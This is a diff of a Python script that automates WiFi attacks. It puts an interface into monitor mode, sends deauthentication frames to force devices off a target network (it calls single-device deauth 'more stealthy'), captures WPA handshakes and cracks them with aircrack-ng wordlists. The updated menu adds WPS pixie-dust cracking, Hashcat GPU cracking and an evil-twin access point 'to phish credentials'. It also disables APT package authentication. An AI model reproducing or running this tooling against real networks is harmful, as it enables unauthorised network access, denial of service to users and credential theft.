-                os.system("airmon-ng | grep -i 'wlan*' | cut -d' ' -f 1 | awk -F ' ' {'print $2'}")
+                os.system("ls /sys/class/net | grep ^wl")
                 print("\n")
-                index = input("[?]What card shall I put in monitor mode? wlan0 [enter 0] wlan1 [enter 1] etc >>")
-                query = ("wlan"+"%s" %(index))
-                query = str(query)
-                os.system("airmon-ng start %s >> log.txt" %(query))
-                print("[info]1) Ok, seems like %s is started, time to get crackin'" %(query))
+                global index
+                index = input("[?] What card shall I put in monitor-mode/use? (copy/paste) >> ")
+                index = str(index)
+                os.system("ip link set %s down;iw dev %s set type monitor;ip link set %s up" %(index,index,index))
+                print("[info] 1) Ok, seems like %s is started, time to get crackin'" %(index))
                 print("[info] 2) now, we'll run Airodump-ng to capture the handshake")
                 input("[info] 3) once you start airodump, you need to press ctrl+c when you see your target network. \n\n[?] press enter to continue >>")
-                os.system("airodump-ng -a %smon" %(query)) 
+                os.system("airodump-ng -a %s" %(index)) 
                 print("Ok, all I need is a few things from you")
-                b = input("[?]First, we'll create a new file to store the key in. What shall I call it? [no spaces]>>")
+                b = input("[?] First, we'll create a new file to store the key in. What shall I call it? [no spaces/MAC addresses]>>")
                 b = str(b)
                 c = input("[?] Now, tell me the (copy/paste) channel {look at CH column} of the network [no spaces]>>")
                 c = str(c)
-                d = input("[?]Finally tell me the (copy/paste) bssid of the network [no spaces]>>")
+                d = input("[?] Finally tell me the (copy/paste) bssid of the network [no spaces]>>")
                 d = str(d)
                 if b and c and d != "":
-                    print("[info]Now, the idea is when someone connects/reconnects, we grab the password")
+                    print("[info] Now, the idea is when someone connects/reconnects, we grab the password")
                     print("[info] That's why we need to disconnect someone. You dont have to, you can wait for someone to connect or connect manually")
-                    print("[info]You can leave it blank to not disconnect anyone")
-                    e = input("\n[?]How many de-auths/disconnects shall I send? Don't use '0'! >>")
+                    print("[info] You can leave it blank to not disconnect anyone")
+                    e = input("\n[?] How many de-auths/disconnects shall I send? Don't use '0'! >>")
                     e = str(e)
-                    print("[info] Look at the second column where it says bssid/station.")
-                    print("[info]In simple terms the bssid is the wifi access point and the station is a devices connected to that network.")
-                    print("[info]You can copy/paste a station address to de-auth/disconnect a specific device rather than all devices on the network")
-                    print("[info]This is a more stealthy as only one device is being disconnected.")
-                    print("[info]please ensure that the station (address) you copy/paste is connected to the the bssid you copied earlier [Look in the bssid column]")
-                    print("It is optional but you can also leave this blank if you still don't get it")
-                    g = input("\n[?]Please copy/paste station (address) here or leave blank>>")
-                    g = str(g)
-                    if e != "" and g != "":
-                        input("\n[?]PRESS ENTER TO RUN. ONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT PRESS CTRL+C!! THIS IS VITAL!! [press enter]>>" %(d))
-                        os.system("iwconfig %smon channel %s" %(query,c))
-                        os.system("xterm $HOLD -title 'DEAUTHING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e aireplay-ng -0 %s -a %s -c %s %smon;airodump-ng -w %s -c %s --bssid %s %smon" %(e,d,g,query,b,c,d,query))
-                        print("[info]If you saw [WPA HANDSHAKE: %s] at the top right,then its time to crack the handshake." %(d))
-                        print("[info]First make sure you have a wordlist which has the password in it ")
-                        print("[info]Once you download or locate one press enter")
-                        print("[info]Hopefully the password will be in there or put it in there")
-                        f = input("\n\n[+]Drag the wordlist on the terminal, literally!! use the file manager! >>")
-                        f = str(f)
-                        print("[info]Ok, ready? press enter to start cracking")
-                        print("[info]If nothing is found after a while then ctrl+c and try again with a different wordlist")
-                        input("[press enter]>>")
-                        os.system("aircrack-ng %s-01.cap -w %s" %(b,f))
-                        print("\n\n[+]LOOK AT KEY FOUND, THAT'S THE PASSWORD. WRITE IT DOWN SOMEWHERE!")
-                        print("[+]CONGRATS IF YOU FIND THE PSK!")
-                        clearScreen()
-                    elif e != "" and g == "":
-                        input("\n[?]PRESS ENTER TO RUN. ONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT PRESS CTRL+C!! THIS IS VITAL!! \n[press enter]>>" %(d))
-                        os.system("iwconfig %smon channel %s" %(query,c))
-                        os.system("xterm $HOLD -title 'DEAUTHING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e aireplay-ng -0 %s -a %s %smon;airodump-ng -w %s -c %s --bssid %s %smon" %(e,d,query,b,c,d,query))
-                        print("\n[info]If you saw [WPA HANDSHAKE: %s] at the top right,then its time to crack the handshake." %(d))
-                        print("[info]First make sure you have a wordlist which has the password in it ")
-                        print("[info]Once you download or locate one press enter")
+                    def post_frame():
+                        print("\n[info] If you saw [WPA HANDSHAKE: %s] at the top right,then its time to crack the handshake." %(d))
+                        print("[info] First make sure you have a wordlist which has the password in it ")
+                        print("[info] Please download or locate one ")
                         print("[info] Hopefully the password will be in there or put it in there")
-                        f = input("\n[+]Drag the wordlist on the terminal, literally!! use the file manager! >>")
-                        f = str(f)
+                        input("\n[+] Please Specify wordlist. Press enter to open file selection>>")
+                        def wordlist():
+                            from tkinter.filedialog import Tk
+                            from tkinter.filedialog import askopenfilename
+                            Tk().withdraw()
+                            global f
+                            f = askopenfilename()
+                            f = str(f)
+                        wordlist()
                         print("[info] Ok, ready? press enter to start cracking")
-                        print("[info]If nothing is found then ctrl+c and try again")
+                        print("[info] If nothing is found then ctrl+c and try again")
                         input("[press enter]>>")
-                        os.system("aircrack-ng %s-01.cap -w %s" %(b,f))
-                        print("\n\n[+]LOOK AT KEY FOUND, THAT'S THE PASSWORD. WRITE IT DOWN SOMEWHERE!")
-                        print("[+]CONGRATS IF YOU FIND THE PSK!")
-                        clearScreen()					
-                    else:
-                        print("[info] Ok, you have chosen not to disconnect anyone.")
-                        print("[info]You need to wait for someone to connect or connect manually yourself")
-                        input("[info]Ready? Hit enter to run. When you see WPA HANDSHAKE:%s at the top right press ctrl+c>>" %(d))
-                        os.system("\niwconfig %smon channel %s" %(query,c))
-                        os.system("\nairodump-ng -w %s -c %s --bssid %s %smon" %(b,c,d,query))
-                        print("\n[info]If you saw [WPA HANDSHAKE: %s] at the top right,then its time to crack the handshake." %(d))
-                        print("[info]First make sure you have a wordlist which has the password in it ")
-                        print("[info]Once you download or locate one press enter")
-                        print("[info]Hopefully the password will be in there or put it in there")
-                        f = input("\n[+]Drag the wordlist on the terminal, literally!! use the file manager! >>")
-                        f = str(f)
-                        print("[info]Ok, ready? press enter to start cracking")
-                        print("[info]If nothing is found then ctrl+c and try again")
-                        input("[press enter]>>")
-                        os.system("aircrack-ng %s-01.cap -w %s" %(b,f))
-                        print("\n\n[+]LOOK AT KEY FOUND, THAT'S THE PASSWORD. WRITE IT DOWN!")
-                        print("[+]CONGRATS IF YOU FIND THE PSK!")
+                        os.system("aircrack-ng HANDSHAKES/%s-01.cap -w %s" %(b,f))
+                        print("\n\n[+] LOOK AT KEY FOUND, THAT'S THE PASSWORD. WRITE IT DOWN!")
+                        print("[+] CONGRATS IF YOU FIND THE PSK!")
                         clearScreen()
+                    def standard():
+                        os.system('clear')
+                        input("\n[?] PRESS ENTER TO RUN. ONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT PRESS CTRL+C!! THIS IS VITAL!! [press enter]>>" %(d))
+                        os.system("iwconfig %s channel %s" %(index,c))
+                        os.system("xterm $HOLD -title 'DEAUTHING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e aireplay-ng -0 %s -a %s -c %s %s --ignore-negative-one;airodump-ng -w HANDSHAKES/%s -c %s --bssid %s --ignore-negative-one %s" %(e,d,g,index,b,c,d,index))
+                        post_frame()
+                    def broadcast_deauth():
+                        os.system('clear')
+                        input("\n[?] PRESS ENTER TO RUN. ONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT PRESS CTRL+C!! THIS IS VITAL!! \n[press enter]>>" %(d))
+                        os.system("iwconfig %s channel %s" %(index,c))
+                        os.system("xterm $HOLD -title 'DEAUTHING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e aireplay-ng -0 %s -a %s %s --ignore-negative-one;airodump-ng -w HANDSHAKES/%s -c %s --bssid %s --ignore-negative-one %s" %(e,d,index,b,c,d,index))
+                        post_frame()
+                    def no_deauth():
+                        os.system('clear')
+                        print("[info] Ok, you have chosen not to disconnect anyone.")
+                        print("[info] You need to wait for someone to connect or connect manually yourself")
+                        input("[info] Ready? Hit enter to run. When you see WPA HANDSHAKE:%s at the top right press ctrl+c>>" %(d))
+                        os.system("\niwconfig %s channel %s" %(index,c))
+                        os.system("\nairodump-ng -w HANDSHAKES/%s -c %s --bssid %s --ignore-negative-one %s" %(b,c,d,index))
+                        post_frame()
+                    def sta():
+                        global g
+                        print("\n[info] Look at the second column where it says bssid/station.")
+                        print("[info] If you don't have that then leave you'll have to de-auth everyone or not de-auth by leaving it blank.")
+                        print("[info] You can copy/paste a station address to de-auth/disconnect a specific device rather than all devices on the network")
+                        print("[info] This is more stealthy as only one device is being disconnected.")
+                        print("[info] please ensure that the station (address) you copy/paste is connected to the the bssid you copied earlier [Look in the bssid column]")
+                        print("It is optional but you can also leave this blank if you still don't get it")
+                        g = input("\n[?] Please copy/paste station (address) here or leave blank>>")
+                        g = str(g)
+                    if e == "":
+                        no_deauth()
+                    else:
+                        sta()
+                        if e != "" and g != "":
+                            standard()
+                        elif e != "" and g == "":
+                            broadcast_deauth()
+                        else:
+                            no_deauth()
                 else:
-                    input("[-]You missed something, try again, \n[press enter]>>")
+                    input("[-] You missed something, try again, \n[press enter]>>")
                     mainScreen()
             mainScreen()
         except(KeyboardInterrupt,EOFError,TypeError,TabError,NameError):
-            print("\n[info]Wait a few seconds, cleaning up...")
-            os.system("airmon-ng stop wlan1mon >> log.txt;echo 'almost done';airmon-ng stop wlan0mon >> log.txt")
+            print("\n[info] Wait a few seconds, cleaning up...")
+            os.system("sudo ip link set %s down && sudo iw dev %s set type managed && sudo ip link set %s up" %(index, index, index))
+            os.system("sudo systemctl start NetworkManager.service")
+            os.system("sudo systemctl start wpa_supplicant.service")
             os.system("clear")
-            if input("\n[-]Press [y] to exit or any other key to return to start>>").lower().startswith("y"):
-                os.system("rm log.txt")
+            if input("\n[-] Press [y] to exit or any other key to return to start>>").lower().startswith("y"):
+                os.system("rm log.txt 2>/dev/null")
                 os._exit(1)
             else:
                 os.system("clear")
                 title()
-                os.system("rm log.txt")
-def title():
+                os.system("rm log.txt 2>/dev/null")
+def title(): #Works so far
     try:
         import os
         os.system('clear')
-        print("[?]What tool would you like to use? Please run as root or after 'sudo su'")
+        if os.getuid() != 0:
+            print("[?] Not running as root! Please re-run after 'sudo su'\n")
+            os._exit(1)
+        print("[?] What tool would you like to use? Please run as root or after 'sudo su'")
         print("Type [1] - Aircrack-ng to crack WPA/WPA2")
         print("Type [2] - Reaver with pixie dust to crack WPS (rare vulnerability)")
         print("Type [3] - Add the Kali-Rolling Sources and install any dependancies")
         print("Type [4] - If you used option [3] and APT broke, use this to fix it")
-        selection = input("Press 1, 2, 3 or 4 >>")
+        print("Type [5] - Update and upgrade all system packages")
+        print("Type [6] - Add an alias to invoke from anywhere")
+        print("Type [7] - If you used option [6] and terminal broke, use this to fix")
+        print("Type [8] - Setup Hashcat and drivers to use GPU for cracking")
+        print("Type [9] - Host a Evil-Twin/MITM AP to phish credentials, sniff traffic and more.")
+        print("Type [10] - Crack an existing WPA/WPA2 handshake using CPU/GPU.")
+        print("\n\nType [99] - Exit ")
+        selection = input("\n|MENU|(Press 1, 2, 3, 4, 5, 6 or 7) >>")
         if selection == "1":
             aircrackng()
         elif selection == "2":
@@ -288,6 +1142,58 @@ def title():
             install_deps()
         elif selection == "4":
             revert()
+        elif selection == "5":
+            import os
+            os.system("clear")
+            if input("\n[+]|MENU|APT_UPDATE|(Update system and perform full-upgrade to system?)  [y/n]>>").lower().startswith("y"):
+                os.system("sudo apt-get install xterm apt >> log.txt -y --allow-unauthenticated")
+                os.system("sudo xterm $HOLD -title 'Updating, do not close!'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e 'apt update --allow-unauthenticated;apt full-upgrade -y --allow-unauthenticated;apt autoclean;apt autoremove -y --allow-unauthenticated' ")
+                print("System is up to date, Goodbye!")
+                os.system("rm log.txt 2>/dev/null")
+                os._exit(1)
+            else:
+                title()
+        elif selection == "99":
+            import os
+            log = os.system("ls -a | grep -i 'log.txt' >> log.txt")
+            if log == 0:
+                os.system("rm log.txt 2>/dev/null")
+                os.system("clear")
+            else:
+                pass
+            os._exit(1)
+        elif selection == "6":
+            aliasfunc()
+        elif selection == "7":
+            unaliasfunc()
+        elif selection == "8":
+            def menufunc():
+                import os
+                print("[-] Checking for dependancies")
+                check_depends()
+                os.system("clear")
+                print("\nType [1] - Download and setup Hashcat to crack WPA/WPA2 handshakes with a NVIDIA-GTX/AMD-RADEON GPU")
+                print("Type [2] - Download the OPENCL/OPENGL GPU drivers required by Hashcat")
+                print("Type [3] - Install the driver files downloaded from option [2]")
+                print("\n\nType [99] - Return to menu")
+                sel2 = input("\n|MENU|POST_CRACK|(ENTER CHOICE) ~# ")
+                if sel2 == "1":
+                    hashcatdownloadfunc()
+                if sel2 == "2":
+                    driverdownloadfunc()
+                if sel2 == "3":
+                    drifunc()
+                if sel2 == "99":
+                    title()
+                else:
+                    menufunc()
+            menufunc()
+        elif selection == "9":
+            print("\n[-] Checking for dependancies")
+            check_depends()
+            mitm_fakeap_func()
+        elif selection == "10":
+            handshake_func()
         else: 
             os.system('clear')
             title()
@@ -295,8 +1201,9 @@ def title():
         print("\n")
         log = os.system("ls -a | grep -i 'log.txt' >> log.txt")
         if log == 0:
-            os.system("rm log.txt")
+            os.system("rm log.txt 2>/dev/null")
         else:
             pass
         os._exit(1)
 title()
+
